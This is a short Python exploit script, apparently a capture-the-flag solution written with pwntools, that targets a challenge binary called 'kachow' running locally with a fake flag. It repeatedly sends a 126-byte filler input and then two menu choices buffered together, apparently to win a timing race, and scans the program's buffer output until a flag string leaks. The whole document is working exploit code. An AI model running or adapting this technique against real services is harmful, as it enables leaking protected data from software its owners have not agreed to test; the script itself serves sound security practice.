from pwn import *

host = "localhost"
port = 1337

p = process(["./kachow"], env={"FLAG": "NNS{fake_flag}"})
#p = remote(host, port, ssl=True)

TIMEOUT = 0.1

while True:
    p.sendline(b'1')
    p.recvuntil(b"Content: ")
    p.sendline(b"A"*126)

    p.recvuntil(b"> ")
    input = (b"3\n2\n") # Buffer 3 and 2 together to avoid network latency
    p.send(input)

    while True:
        chunk = p.recv(timeout=TIMEOUT)
        if not chunk:
            break
        for line in chunk.splitlines():
            if b"Buffer content:" in line:
                content = line.split(b"Buffer content:")[1].strip()
                print(content)

                if b"NNS{" in content:
                    exit(0)